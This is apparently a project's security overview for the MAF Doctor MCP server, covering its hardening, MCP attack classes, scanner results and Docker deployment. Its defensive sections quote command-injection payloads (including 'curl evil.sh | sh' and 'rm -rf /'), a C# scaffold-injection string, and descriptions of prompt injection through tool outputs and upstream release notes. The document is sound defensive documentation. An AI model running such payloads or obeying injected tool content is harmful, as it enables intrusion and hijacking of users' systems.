# Security — how MAF Doctor (`maf-doctor`) is hardened

> **Audience:** end users evaluating whether MAF Doctor is safe to install in their environment, and maintainers verifying mitigations stay in place.
>
> **For the deep technical breakdown** of attack surfaces, mitigations, and acknowledged gaps, read [`docs/security/threat-model.md`](security/threat-model.md). This file is the high-level overview.
>
> **If you're hardening your OWN MCP server**, see [`docs/mcp-security-hardening-best-practices.md`](mcp-security-hardening-best-practices.md) — a reusable playbook distilled from the patterns below: threat lattice (T1–T10), seven code-side invariants, GitHub Actions hardening, Cisco mcp-scanner CI wiring, the five CI invariants, and a quick-start checklist.

---

## Security documentation map

Four documents, four audiences — read the one that matches your question:

| Document | Read it when you want to… | Genre |
| --- | --- | --- |
| [`SECURITY.md`](../SECURITY.md) | **report a vulnerability** or see the scope/disclosure policy | GitHub Security-tab policy |
| **`docs/security.md`** (this file) | **evaluate whether it's safe to install** — the plain-language posture and the latest scan result | User-facing overview |
| [`docs/security/threat-model.md`](security/threat-model.md) | trace a **specific attack surface** to its mitigation, or see the acknowledged residual gaps | Formal threat model |
| [`docs/mcp-security-hardening-best-practices.md`](mcp-security-hardening-best-practices.md) | **harden your own** MCP server using these patterns | Reusable playbook |

Reporting policy and disclosure timelines live in `SECURITY.md`; this file does
not restate them. The canonical **scanner-usage / latest-scan-result** home is
this file's [§ Latest scan results](#latest-scan-results) — the threat model and
the playbook link here rather than duplicating the numbers.

---

## How we tackle security

### At the MCP-protocol level

| Mechanism | What it does | Where to verify |
|---|---|---|
| **MCP tool annotations** (`ReadOnly` / `Destructive` / `Idempotent` / `OpenWorld`) | Every one of the 28 `[McpServerTool]` decorations declares its behavior class. Well-behaved clients (Claude Code, VS Code Copilot) use this to decide which tools auto-invoke vs need user confirmation — preventing prompt-driven exfiltration via tools the user didn't expect to fire. | `src/maf-autopilot/Tools/*.cs` — see annotation classification in [`CHANGELOG.md`](../CHANGELOG.md) under 1.0.0 breaking changes |
| **Structured outputs** (JSON / SARIF) | `MafDoctor`, `MafScanAntiPatterns`, `MafValidateFanOut` etc. emit machine-readable schemas — no free-form prose that could embed prompt-injection payloads back into the LLM context | [`docs/output-schemas.md`](output-schemas.md) |
| **No generic shell tool, no string-concatenated commands** | We do NOT expose `execute_command(string)`. Everything is a narrow, purpose-built tool. Every subprocess spawn (`dotnet build`, `dotnet-inspect diff`, the `dnx` fallback, `git`) uses `ProcessStartInfo.ArgumentList` (argv-style, no shell) — see [Command injection via tool arguments](#command-injection-via-tool-arguments-keysight-2026) below for the structural breakdown | grep for `Process.Start` — as of the 2026-07-19 pass (F-09), consolidated to exactly one real call site, `src/maf-autopilot/Tools/ProcessRunner.cs`'s shared `Run` helper; `PullRequestAuditTool.cs`'s git invocation now routes through it too instead of a standalone spawn |
| **Path-validated repo input** | All tools that read user-repo files route through `PathGuard.ValidateRepoPath()` — rejects empty/nonexistent/malformed paths, and (MCP mode only) checks the path against the configured workspace policy | `src/maf-autopilot/Tools/PathGuard.cs`, `src/maf-autopilot/Tools/WorkspacePolicy.cs` |
| **MCP workspace allowlist** | `MAF_DOCTOR_WORKSPACE_ROOTS` scopes which absolute paths an MCP-connected agent can point tools at; filesystem roots and the user home directory are always rejected in MCP mode regardless of configuration. CLI usage is unaffected — a human typing a path at their own shell is the trust boundary. `init` sets this to the initialized repo on first write. | `src/maf-autopilot/Tools/WorkspacePolicy.cs` |
| **Preview-by-default writes** | `MafAutoFix` / `MafAutoFixAll` default `dryRun` to `true` (MCP), and CLI `autofix-all` previews unless `--apply` is passed — a client that misreads or auto-approves the `Destructive` hint, or a human running the command out of habit, gets a preview, not an unreviewed write | `src/maf-autopilot/Tools/AutoFixTool.cs`, `src/maf-autopilot/Commands/AutoFixCli.cs` |
| **Symlink/reparse-point containment on every write** | `SafeWorkspaceWriter` stages through an unpredictable temp filename, opens with `FileMode.CreateNew` (refuses to follow a pre-existing/attacker-raced path), and rejects a symlinked leaf or parent anywhere in the write target — used by auto-fix, `init`, the scaffolders, the registry-override reader, and the update cache | `src/maf-autopilot/Tools/SafeWorkspaceWriter.cs` |
| **5 MB cap on env-overridden registry** | `MAF_REGISTRY_PATH` env override caps file size to prevent OOM via a multi-GB poisoned registry | `src/maf-autopilot/Data/RegistryService.cs` (`RegistryMaxBytes`) |

### At the repo level

| Mechanism | What it does | Where to verify |
|---|---|---|
| **Roslyn analyzer NuGet** | Ships as `maf-doctor.Analyzers` (separate NuGet). 3 rules (`MAF001`, `MAF002`, `MAF003`) fire at write-time in the IDE — `MAF002` blocks `DefaultAzureCredential` in production code; `MAF003` blocks `EnableSensitiveData = true` outside tests | `src/maf-autopilot.Analyzers/*.cs` |
| **Multi-version regression CI** | Roslyn rewriters are run on pinned MAF 1.0 / 1.2 / 1.3 sample projects on every push — rewriter bugs that corrupt user code get caught before merge | `.github/workflows/*.yml` + `samples/maf-1.x-sample/` |
| **`verify-registry` PR gate** | The AI-fill maintenance loop (release-watcher → Copilot Coding Agent → PR) is gated by a structural verifier — placeholders, broken examples, missing fields are caught before the PR can merge | `.github/workflows/maf-ai-fill-verify.yml` + `src/maf-autopilot/Commands/VerifyRegistryCommand.cs` |
| **MIT-licensed, source-available** | All tools, the analyzer, the rewriters, the registry — readable in the repo. No closed-source binaries shipped in the nupkg | `LICENSE` |
| **No floating installs in privileged CI jobs** | The release-watcher and 3 other workflows carrying write permissions build `maf-doctor` from the already-checked-out, already-reviewed source instead of installing whatever's newest on NuGet (`--prerelease`) — what runs is exactly the commit under review, not a supply-chain-mutable download | `.github/workflows/maf-release-watcher.yml`, `maf-ai-fill-verify.yml`, `maf-drift-detector.yml`, `maf-pr-audit.yml` |
| **Exact-pinned CI tooling** | `pyyaml`, `pytest`, `pipx`, `cisco-ai-mcp-scanner` — all exact-versioned in CI, not floating ranges, in every job that carries write permissions | `.github/workflows/*.yml` |
| **Authoritative PR-comment identity check** | The privileged PR-audit-comment workflow resolves which PR to comment on via the GitHub API from the trusted `workflow_run` head SHA — not an unvalidated artifact claim — and fails closed on any mismatch | `.github/workflows/maf-pr-audit-comment.yml` |
| **Release version integrity** | A single source of truth resolves the published version from tag/manual-input/csproj; a post-build verification step fails the release if the packed NuGet version doesn't match what was resolved | `.github/workflows/release.yml` |
| **Locked, reproducible restores** | `packages.lock.json` for every project; CI restores in `--locked-mode`, failing if the lock file disagrees with the declared package versions instead of silently resolving a different dependency graph | `Directory.Build.props`, `*/packages.lock.json` |
| **Digest-pinned container base images** | `Dockerfile` pins `FROM` by `sha256` digest, not a mutable tag — Dependabot tracks and PRs digest bumps on the same cadence as the SHA-pinned GitHub Actions | `Dockerfile` |

---

## Container capability boundary (SEC-10)

The published image (`ghcr.io/joslat/maf-doctor`) is built on the **.NET runtime** base
(~150 MB), not the SDK (~900 MB). That keeps the image small but means the tools that
shell out to the .NET SDK are **not available inside the container**:

| Tool | Needs | In the container |
|---|---|---|
| `MafRunCs0618Hunt` | `dotnet build` (SDK) | ❌ not available |
| `MafDiffPackage` | `dotnet-inspect` / `dnx` (SDK) | ❌ not available |
| `MafPreUpgradeDryRun` | `dotnet-inspect` / `dnx` (SDK) | ❌ not available |
| `MafAuditPullRequest` | `git` | ✅ works (`git` is installed) |
| everything else (scan / lint / cost / scaffold / registry / doctor) | Roslyn only | ✅ works |

The unavailable tools **detect the missing binary and return a clear message**
(`"… not available in this environment … dotnet tool install -g maf-doctor"`) rather
than crashing. To use the SDK-dependent tools, install the .NET **global tool** on a
host that has the SDK: `dotnet tool install -g maf-doctor`.

---

## Known MCP attack classes — coverage status

This section names public, well-documented MCP attack classes and shows — with file/line citations — the mitigation in place for each and, honestly, how strong a guarantee it actually is. Some of these are structural (a compiler/CI-enforced invariant that cannot silently regress); others are behavioral mitigations against a probabilistic model, which reduce risk but are not a hard guarantee no LLM will ever be talked into ignoring them — those are labeled **Mitigated, not eliminated** rather than a flat "not vulnerable." If a class isn't listed here, see [`docs/security/threat-model.md`](security/threat-model.md) for the full attack-surface map. The classes below are anchored against the canonical sources listed in the [Canonical references](#canonical-references) section at the end of this document.

### Command injection via tool arguments (Keysight, 2026)

**Reference:** [Command Injection: Uncovering A New Attack Vector of MCP Server — Keysight Blogs, 12 Jan 2026](https://www.keysight.com/blogs/en/tech/nwvs/2026/01/12/mcp-command-injection-new-attack-vector)

**The attack — in one sentence.** If an MCP server exposes a tool that shells out and *concatenates* tool arguments into a command string, the LLM can be prompt-injected into emitting arguments that break out of the intended command (`; rm -rf /`, `&& curl evil.sh | sh`, backtick subshells, etc.). Structurally identical to SQL injection: untrusted input → string concatenation → interpreter.

**Are we vulnerable? No.** Four independent reasons, each verifiable from the repo:

#### 1. No generic shell tool is exposed to the LLM

None of the 28 `[McpServerTool]`s accept "a command to run." Every tool is a narrow capability the LLM *selects* — it does not parameterize a shell with model-generated text. There is no `execute_command(string)`, no `run_sql(string)`, no eval surface. The LLM picks *which* tool fires; it does not get to dictate *what command* runs.

#### 2. All subprocess spawn sites use `ArgumentList`, never string concatenation

With `ProcessStartInfo.ArgumentList`, .NET passes each element to the OS as a separate `argv[i]`. There is no shell to inject into — a payload like `; rm -rf /` would arrive at the child process as a single literal argv string and be rejected as a malformed argument. The unsafe `ProcessStartInfo.Arguments` *string* property (which Windows re-parses with shell-style splitting) is **not used anywhere** in the codebase.

The exhaustive list of argv-construction sites, all four inside `ProcessRunner` and funneling through its one shared `Process.Start` call (`ProcessRunner.cs:161`) — as of the 2026-07-19 pass (F-09), `PullRequestAuditTool`'s git invocation was folded in here too, replacing a standalone spawn site with a call to `ProcessRunner.RunGit`:

| File:line | Process | Argument construction |
|---|---|---|
| [`Tools/ProcessRunner.cs:41`](../src/maf-autopilot/Tools/ProcessRunner.cs) | `dotnet build` | `ArgumentList = { "build", projectOrSolutionPath, "--nologo" }` |
| [`Tools/ProcessRunner.cs`](../src/maf-autopilot/Tools/ProcessRunner.cs) | `dotnet-inspect --version` (fail-closed exact-0.9.1 probe; `+metadata` accepted) | `ArgumentList = { "--version" }` |
| [`Tools/ProcessRunner.cs:89`](../src/maf-autopilot/Tools/ProcessRunner.cs) | `dotnet-inspect diff` | `ArgumentList = { "diff", "--package", $"{id}@{old}..{new}", "--source", … }` |
| [`Tools/ProcessRunner.cs:117`](../src/maf-autopilot/Tools/ProcessRunner.cs) | `dnx dotnet-inspect@0.9.1` (on-demand fallback, gated by `MAF_DOCTOR_ALLOW_TOOL_DOWNLOAD` — see F-12 in [`docs/security/threat-model.md`](security/threat-model.md#316-auto-fix-and-scaffold-tool-readonlydestructive-semantics-2026-07-19-closure)) | `ArgumentList = { "dotnet-inspect@0.9.1", "-y", "--source", …, "--", "diff", … }` |
| [`Tools/ProcessRunner.cs:150`](../src/maf-autopilot/Tools/ProcessRunner.cs) | `git` (diff, invoked by `PullRequestAuditTool` via `RunGit`, now `-z`-delimited — F-07) | `ArgumentList = { "-C", repoPath, args... }` |

All five configurations set `UseShellExecute = false`. There is no `cmd.exe /c`, no `bash -c`, no PowerShell pipeline anywhere in the spawn path.

#### 3. The invariant is checkable in one grep

```bash
grep -rn "Process.Start" src/
```

Returns exactly one real call site (`ProcessRunner.cs:161`, inside the shared `Run` helper every construction site above funnels through) plus (a) security-documentation comments in `src/maf-autopilot/Scaffolding/AgentScaffolder.cs` that name `Process.Start` inside a code-injection-payload example, and (b) negative-test fixtures in `src/maf-autopilot.Tests/ScaffolderSecurityTests.cs` that prove the scaffolder rejects those payloads. Both comment-only and test-only hits are correctly excluded by [`ci-invariants.yml` Job 1](../.github/workflows/ci-invariants.yml), which scopes its regex to call-site syntax and skips both the tests directory and lines beginning with `//`. The allowlist was tightened in the 2026-07-19 pass to just `ProcessRunner.cs` (previously also exempted `PullRequestAuditTool.cs`, before its git call moved into `ProcessRunner`). If a future PR adds a new spawn site outside `ProcessRunner.cs`, or one that uses the unsafe `Arguments` string property instead of `ArgumentList`, CI fails — see also [`CONTRIBUTING.md`](../CONTRIBUTING.md) §"Adding an MCP server tool."

#### 4. Cisco mcp-scanner enforces this from the outside

The scanner's `code_execution` and `parameter_injection` YARA rules flag any tool whose `[Description]` or argument shape suggests shell execution. Latest recorded run (2026-05-17, v4.6.0): **0 findings across 25 tools** — see [scan results](#latest-scan-results) below. This check is now a required, hard-failing gate on every PR (F-16) rather than advisory — see the [Scan cadence](#scan-cadence) section.

#### What would break this guarantee

So reviewers know what to reject: a contributor adding

```csharp
new ProcessStartInfo("dotnet") { Arguments = userInput }   // ← UNSAFE
```

— note the singular `Arguments` *string* property, which Windows re-parses with shell-style splitting. Always use `ArgumentList`. The [`ProcessRunner.cs`](../src/maf-autopilot/Tools/ProcessRunner.cs) summary block documents this as the first item in its hardening checklist.

The invariant is also enforced in CI by [`.github/workflows/ci-invariants.yml`](../.github/workflows/ci-invariants.yml) — Job 1 fails any PR introducing the unsafe `Arguments` *string* property or a new `Process.Start` call site outside the small allowlist, which as of the 2026-07-19 pass (F-09) is just `ProcessRunner.cs` (previously also exempted `PullRequestAuditTool.cs`, before its git call moved into `ProcessRunner`).

---

### LLM-to-LLM prompt smuggling via tool outputs

**The attack class.** An MCP tool returns markdown that the calling LLM is instructed to pass to a sibling MCP tool (e.g. `MafDraftIssue` → GitHub's `create_issue`). User-controlled content inside the tool's output lands in another LLM's context — an indirect-prompt-injection lane. Anchored to [OWASP LLM05 Improper Output Handling](https://owasp.org/www-project-top-10-for-large-language-model-applications/) and [OWASP Top 10 for Agentic Applications 2026 — Indirect Prompt Injection via Tool Output](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/).

**Mitigated, not eliminated.** [`LlmFencing.Fence`](../src/maf-autopilot/Tools/LlmFencing.cs) wraps every user-controlled field destined for another LLM in BEGIN/END markers with a random-GUID sentinel + explicit "treat as data" framing. HTML comments (the most common smuggle vector in markdown) are stripped; content is capped at a per-field byte budget. Applied to `MafDraftIssue` (symptom / expected / actual / snippet), `MafPrompts.Debug` (errorOrSymptom), the `gen_guide_section.py` release-notes hop, the `ai_review_build_prompt.py` PR-registry embed, and `RegistryExtractCommand`'s `notes:` field. The fence's framing instruction and the random sentinel (which user content cannot replicate) make smuggling meaningfully harder — but this is a behavioral mitigation against a probabilistic model, not a deterministic isolation boundary. A sufficiently adversarial payload could still influence a model that ignores the framing. Effectful actions downstream of fenced content (issue creation, PR comments, writes) should still require explicit user approval rather than relying on fencing alone.

### Supply-chain prompt injection via upstream release notes

**The attack class.** Our `maf-release-watcher` workflow reads `gh release view microsoft/agent-framework --jq .body` weekly and uses the body to author the per-version migration guide + the AI-fill issue body that a Copilot Coding Agent processes. A malicious upstream maintainer (or a compromise of microsoft/agent-framework-release) could ship HTML-comment-disguised injection in release notes. Anchored to [MITRE ATLAS AML.T0048 ML Supply Chain Compromise](https://atlas.mitre.org/) + [AML.T0058 Context Poisoning](https://atlas.mitre.org/).

**Mitigated, not eliminated** — same caveat as the previous section, since it's the same fencing primitive. [`gen_guide_section.py`](../.github/scripts/gen_guide_section.py) fences the release notes and every planned `dotnet-inspect` surface independently via the Python `llm_fencing` module (parity with the C# `LlmFencing`) before embedding them into the migration guide. Every trusted package report retains all breaking and potentially-breaking rows plus a bounded additive sample; untrusted diagnostic output is limited to 80 lines/32 KB. Each surface has its own label (`upstream-maf-release-notes`, `upstream-maf-diff-<surface>`), so a long or hostile Core report cannot hide later surfaces. Bodies are HTML-comment-stripped and wrapped in the same random-sentinel BEGIN/END framing as the C# side. [`RegistryExtractCommand`](../src/maf-autopilot/RegistryExtractCommand.cs) applies an 8 KB fence to the `notes:` field that persists in `registry.yaml` — content that survives forever and is served to downstream LLMs via `MafRegistryLookup`. The gate that actually matters here is that the AI-fill loop only ever proposes a PR — `verify-registry` and human review stand between fenced-but-still-attacker-influenced content and `main`.

### Workflow input injection (workflow_dispatch templating)

**The attack class.** GitHub Actions `${{ inputs.X }}` substitutes literal text BEFORE shell parsing. Any future contributor who changes a `run:` block in a way that puts the template inside a shell-interpreted context (e.g. unquoted `$( )` or backticks) creates a command-injection lane. Reference: [GitHub — Security Hardening for GitHub Actions](https://docs.github.com/en/actions/reference/security/secure-use).

**Are we vulnerable? No.**

1. Every `workflow_dispatch` workflow **that accepts inputs** has a `validate-inputs` job that runs FIRST with `permissions: {}` (no scopes). It regex-checks the input shape — semver for version fields, positive-int for `pr_number`, hardcoded enum for `bot` / `model`. Downstream jobs gate via `needs: validate-inputs`. Input-less dispatches (e.g. `maf-drift-detector.yml`) do not need the guard.
2. Every `run:` block reads inputs via `env:` redirect (`env: { X: ${{ inputs.X }} }` then `$X` in shell). The single `env:` interpolation is YAML-quoted by the runner; downstream `$X` references are shell-variable expansions, not template substitutions.
3. CI invariant `ci-invariants.yml` Job 4 blocks any future `${{ inputs.* }}` literal inside a `run:` block.
4. Third-party actions are SHA-pinned (13 distinct actions × 42 call sites, repo-wide, verified by grep). Dependabot keeps them current.
5. All 12 workflow files declare an explicit `permissions:` scope (workflow-level or per-job); `validate-inputs` jobs run with no permissions at all.

### Path-escape via secondary path parameters

**The attack class.** Many tools accept a primary `repoPath` and a secondary path (e.g. `MafAutoFix.specificFile`). Joining the secondary path naively via `Path.Combine` or via a `Path.IsPathRooted` short-circuit lets an LLM-supplied absolute path or `..`-segment redirect file I/O outside the repo root. The rewriter then writes through the resolved path. Anchored to [OWASP MCP Top 10 — MCP04 Command Injection / path-escape variant](https://owasp.org/www-project-mcp-top-10/).

**Not vulnerable to the naive-join escape described above; one residual gap remains.** [`PathGuard.ValidateContainment`](../src/maf-autopilot/Tools/PathGuard.cs) is called at every secondary-path entry. It (a) canonicalizes both `repoPath` and the candidate via `Path.GetFullPath`, (b) verifies the resolved path starts with `repoPath + separator`, (c) probes BOTH the resolved file itself AND its parent chain for `FileAttributes.ReparsePoint` — closing the file-level symlink lane that `Path.GetFullPath` alone cannot detect (it canonicalizes `..` syntactically but does not resolve symlinks). Error messages never echo the input path. All writes additionally route through [`SafeWorkspaceWriter`](../src/maf-autopilot/Tools/SafeWorkspaceWriter.cs), which stages through an unpredictable temp name and opens with `CreateNew` rather than a predictable path an attacker could pre-place a symlink at (closed 2026-07, findings F-01/F-02/F-03/F-24 of the July 2026 assessment). F-22 (the `MAF_REGISTRY_PATH` override, in `RegistryService.ValidateOverridePath`) closes the same class of symlink-escape bug but on a *read* path — it never calls `SafeWorkspaceWriter` and has its own independent parent-chain reparse-point check (round-2 review fixup: an earlier version of this doc grouped it with the write-path fixes above, which it isn't one of). The residual: validation and use are still two separate filesystem calls, so a local, same-user actor racing a symlink into place between them is a theoretical TOCTOU window (F-21) — this requires local write access to the same workspace and is not remotely exploitable via tool arguments alone.

### Code injection via scaffold parameters

**The attack class.** Code generators that splice user-supplied identifiers into output source files (e.g. `namespace {{ns}};`) are vulnerable to break-out via crafted parameter values like `MyApp; class Evil { static int x = Process.Start("calc"); }`. The generated file is valid C# and gets compiled into the user's project.

**Are we vulnerable? No.** `AgentScaffolder.IsValidTypeExpression` (for `inputType` / `outputType`) and `AgentScaffolder.IsValidNamespace` (for `projectNamespace`) both use the same defense: pre-reject char filter (`;`, `{`, `}`, `(`, `)`, `=`, newline, NUL, quote, backtick) + Roslyn parse + roundtrip equality check. If Roslyn silently dropped extra tokens after parsing, the printed form differs from the input — that's the actual injection gate. Tests in `ScaffolderSecurityTests` pin a catalog of injection payloads.

### Annotation drift (tool poisoning / consent bypass)

**The attack class.** MCP-spec-compliant clients gate auto-invocation on the `[McpServerTool]` annotations (`ReadOnly` / `Destructive` / `Idempotent` / `OpenWorld`). A wrong annotation is a security bug, not a style issue: setting `ReadOnly=true` on a tool that spawns `dotnet build` is a privilege escalation. Anchored to [MCP Specification — Security Considerations](https://modelcontextprotocol.io/specification/2025-11-25) + [MCP Blog — Tool Annotations as Risk Vocabulary](https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations/) + [Invariant Labs — Tool Poisoning Attack](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks).

**Are we vulnerable? No.** Reflection tests (`McpToolAnnotationTests`) lock the per-tool annotation contract. `CONTRIBUTING.md`'s security rubric requires future tools to match annotations to behavior. The audit found and fixed five drift cases in v1.1: `MafRunCs0618Hunt` (was `ReadOnly=true`, now `false` + `OpenWorld=true` because `dotnet build` reaches NuGet), `MafNewAgent`/`MafNewExecutor` (were `Destructive=false`, now `true` because they write to the project tree), `MafDiffPackage`/`MafPreUpgradeDryRun` (were missing `OpenWorld`, both reach api.nuget.org).

---

## MCP-server security scan — Cisco mcp-scanner

We use **[Cisco mcp-scanner](https://github.com/cisco-ai-defense/mcp-scanner)** to scan our MCP server against known threat patterns. It's:

- Maintained by **Cisco AI Defense** (Apache-2.0, 926+ stars, v4.6.0 April 2026)
- Runnable **fully locally** in yara-analyzer mode (no API keys, no phone-home)
- Detects: prompt injection, tool poisoning, credential harvesting, code execution patterns, parameter injection
- PyPI package: `cisco-ai-mcp-scanner` — CLI binary: `mcp-scanner`

### Note: it's a CLI tool, NOT a VS Code extension

Don't look for it in the VS Code marketplace — none of the established MCP security scanners ship as VS Code extensions. Install via Python tooling:

```bash
python -m pip install --user pipx
python -m pipx ensurepath
pipx install cisco-ai-mcp-scanner
```

(Unpinned here deliberately — if you're verifying our claims yourself, you likely want whatever the scanner currently flags, not our CI's frozen version. CI itself pins to an exact, previously-validated version — see [`mcp-scanner.yml`](../.github/workflows/mcp-scanner.yml) — so a scanner-side regression can't silently change what CI enforces.)

### How to run against this repo

```bash
# Build first if needed
dotnet build maf-autopilot.sln

# Scan via stdio (launches our MCP server as a subprocess)
mcp-scanner --analyzers yara --format summary --hide-safe \
  stdio --stdio-command=dotnet \
  --stdio-arg=run --stdio-arg=--project --stdio-arg=src/maf-autopilot \
  --stdio-arg=--framework --stdio-arg=net10.0 --stdio-arg=--no-build \
  --stderr-file=/tmp/maf-server.log
```

### Latest scan results

**2026-05-17 — Cisco mcp-scanner v4.6.0 (yara analyzer)** — a point-in-time manual record, not auto-updated; the authoritative current status is whatever CI's mcp-scanner check shows on the latest `main` run, now a required, hard-failing check (see [Scan cadence](#scan-cadence) above). Tool count has grown since this snapshot (25 → 28 as of the 2026-07-19 assessment, verified by grep); re-run and update this block at the next tagged release.

```
=== Scan Statistics ===
Total tools: 25
Safe tools: 25
Unsafe tools: 0
Severity breakdown: HIGH: 0, UNKNOWN: 0, MEDIUM: 0, LOW: 0, SAFE: 25
Analyzer stats: yara_analyzer: 25/25 scanned, 0 findings
```

**Triage: zero findings.** All 25 MCP tools enumerated cleanly via stdio (at the time of this snapshot) — no prompt injection, tool poisoning, credential harvesting, or code execution patterns matched.

### Scan cadence

- **Every PR against `main`** that touches `src/maf-autopilot/**`: [`.github/workflows/mcp-scanner.yml`](../.github/workflows/mcp-scanner.yml) runs the scanner, posts results as a sticky PR comment, and **fails the check on any finding** — promoted from advisory to a hard-fail gate on 2026-07-20 after 5 consecutive clean runs (F-16, 2026-07-19 security assessment). See that workflow's rollback playbook if a future false positive needs triage.
- **Weekly cron** (Mondays 11:00 UTC): scheduled run as backstop for findings introduced by upstream regex / tooling drift even without code changes on our side.
- **Every minor release** (1.0 → 1.1 → 1.2): full Cisco mcp-scanner pass; results recorded in [§ Latest scan results](#latest-scan-results) above (the canonical scan-result home — the threat model links here rather than restating the numbers).
- **Pre-tag** during release prep: re-run if any tool was added or modified.

---

## Scanners we evaluated but do NOT recommend

We're explicit about what we deliberately *don't* depend on, so users know the supply chain stays small.

| Scanner | Why we don't use it |
|---|---|
| **[Snyk agent-scan](https://github.com/invariantlabs-ai/mcp-scan)** (formerly Invariant Labs mcp-scan, now Snyk) | Requires a Snyk account + `SNYK_TOKEN`. README confirms it "validates the components, both with local checks **and by invoking the Agent Scan API**" — not local-only; sends data to Snyk's servers. Currently in "Open Preview" (free), but Snyk's commercial tier is paid ($52-$98/dev/month). Account requirement = vendor lock-in regardless of preview status. **We don't gate the open-source release on a tool that requires a third-party account.** |
| **[kapilduraphe/mcp-watch](https://github.com/kapilduraphe/mcp-watch)** | Single-maintainer hobby project. Quality may be fine, but a security tool from an unvetted source is itself a supply-chain risk. |
| **Commercial-only scanners** (Pangea, Enkrypt AI, AQtive Guard) | Fine if your org has a license, but we don't recommend them as the canonical path for an open-source toolkit. |

---

## Outbound network behavior

**MCP server startup makes one outbound call by default** (F-26, 2026-07-19 security assessment): a background, non-blocking check against NuGet for a newer `maf-doctor` release.

| Detail | Value |
|---|---|
| Endpoint | `https://api.nuget.org/v3-flatcontainer/maf-doctor/index.json` |
| When | Once per MCP server process start, on a background task — never blocks tool calls or startup |
| Timeout | 3 seconds |
| User agent | `maf-doctor-update-check/1.0` |
| Cache | `%LOCALAPPDATA%/maf-doctor/update-check.json` (or `$TMPDIR` if unavailable), 24-hour TTL, 64 KB size cap |
| Failure behavior | Silent — logged at debug level only; never surfaces as an error or affects any tool result |
| **Disable it** | Set `MAF_DOCTOR_UPDATE_CHECK=0` (also accepts `false` / `off` / `no`) in the MCP server's `env` config. `MafDoctorStatus` reports whether the check is currently disabled. |

This is the only outbound call the MCP server makes on its own initiative — every other network access (`MafDiffPackage`, `MafPreUpgradeDryRun`, `MafRunCs0618Hunt` restoring packages) is a direct consequence of a tool the user or agent explicitly invoked, and is marked `OpenWorld = true` accordingly. If you're running in a locked-down or fully offline environment, set `MAF_DOCTOR_UPDATE_CHECK=0`.

---

## Container deployment (Docker)

The image runs as a non-root UID regardless of which tools you call — but non-root is a floor, not a substitute for scoping what's mounted. Most MCP tools are read-only; auto-fix, the scaffolders, `init`, and the update-check cache write to whatever's mounted (F-28, July 2026 assessment — an earlier version of this doc and a Dockerfile comment both claimed the server "writes nothing," which was never true for those tools).

**Read-only / analysis-only** — if you only want `doctor`, the scanners, and the explain/plan tools:

```bash
docker run --rm -i \
  --read-only --cap-drop=ALL --security-opt=no-new-privileges \
  -v "$PWD:/workspace:ro" \
  ghcr.io/joslat/maf-doctor:<tag>
```

**Write-enabled** — if you also want auto-fix / scaffolding / `init`: mount only the repository you intend to modify (not your home directory), keep the container off the Docker socket / SSH agent / cloud credentials, and prefer an immutable tag or digest over `:latest` so what you run matches what you reviewed:

```bash
docker run --rm -i \
  -v "$PWD:/workspace" \
  ghcr.io/joslat/maf-doctor:<tag>
```

Neither profile needs network access unless you're calling a tool that reaches NuGet (`MafDiffPackage`, `MafPreUpgradeDryRun`, `MafRunCs0618Hunt`) — add `--network=none` if you're only running the fully local analysis tools.

---

## Reporting a security issue

Reporting and disclosure policy is canonical in **[`SECURITY.md`](../SECURITY.md)** —
in short: **do not open a public issue**, email the maintainer, and expect
acknowledgement within 72 hours with a fix in the next patch release (sooner if
critical). See `SECURITY.md` for the full scope, what's in/out, and recognition.

---

## Canonical references

The MCP / LLM / GitHub-Actions security canon that MAF Doctor's defensive posture is anchored against. Each mitigation in the hardening tables above maps to one or more of these.

| Source | What it names |
|---|---|
| [MCP Specification — Security Considerations (2025-11-25)](https://modelcontextprotocol.io/specification/2025-11-25) | Trust model, behavioral hint accuracy (`readOnlyHint` / `destructiveHint` / `idempotentHint` / `openWorldHint`), user-consent gating, sandboxing |
| [MCP Blog — Tool Annotations as Risk Vocabulary (2026-03-16)](https://blog.modelcontextprotocol.io/posts/2026-03-16-tool-annotations/) | How well-behaved clients use annotations to decide auto-invoke vs. confirmation |
| [OWASP Top 10 for LLM Applications v2025](https://owasp.org/www-project-top-10-for-large-language-model-applications/) | LLM01 Prompt Injection, LLM02 Info Disclosure, LLM05 Improper Output Handling, LLM06 Excessive Agency, LLM07 System Prompt Leakage, LLM10 Unbounded Consumption |
| [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/) | MCP01 Token Mismanagement, MCP02 Excessive Scope, MCP03 Tool Poisoning, MCP04 Command Injection, MCP05 Context Spoofing, MCP06 Insecure Memory References, MCP07 Covert Channel Abuse, MCP08 Model Misbinding, MCP09 Prompt-State Manipulation |
| [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) | Agent Behavior Hijacking, Tool Misuse, Indirect Prompt Injection via tool output |
| [MITRE ATLAS](https://atlas.mitre.org/) | AML.T0051 LLM Prompt Injection, AML.T0048 ML Supply Chain Compromise, AML.T0058 Context Poisoning |
| [Cisco AI Defense MCP Scanner](https://github.com/cisco-ai-defense/mcp-scanner) | YARA categories: prompt injection, tool poisoning, credential harvesting, code execution, parameter injection, cross-origin escalation, rug-pull |
| [Invariant Labs — Tool Poisoning, Shadowing, Rug-Pull (Apr 2025)](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) | TPA, Tool Shadowing, MCP Rug Pull |
| [Snyk Labs — Prompt Injection Meets MCP / MCP Command Injection (2025–2026)](https://labs.snyk.io/resources/prompt-injection-mcp/) | Real-world MCP command-injection CVEs (CVE-2025-5277 aws-mcp, CVE-2025-6514 mcp-remote, CVE-2025-59377 mcp-kubernetes) |
| [Keysight — MCP Command Injection: New Attack Vector (2026-01-12)](https://www.keysight.com/blogs/en/tech/nwvs/2026/01/12/mcp-command-injection-new-attack-vector) | Local STDIO trust-boundary abuse, model-biasing via tool description, runtime-response prompt injection |
| [GitHub — Security Hardening for GitHub Actions](https://docs.github.com/en/actions/reference/security/secure-use) | `pull_request_target` discipline, `workflow_dispatch` input sanitization via env vars, SHA-pin actions, minimum `permissions:`, `GITHUB_TOKEN` least privilege |
| [NIST SP 800-218A — SSDF Community Profile for AI](https://csrc.nist.gov/pubs/sp/800/218/a/final) | PW.4/PW.5 secure-by-design tasks, PS.1 third-party model/tool provenance, RV.1/RV.2 post-release vuln id |
| [CSA mcpserver-audit](https://github.com/ModelContextProtocol-Security/mcpserver-audit) | Pre-install MCP audit checklist |

## See also

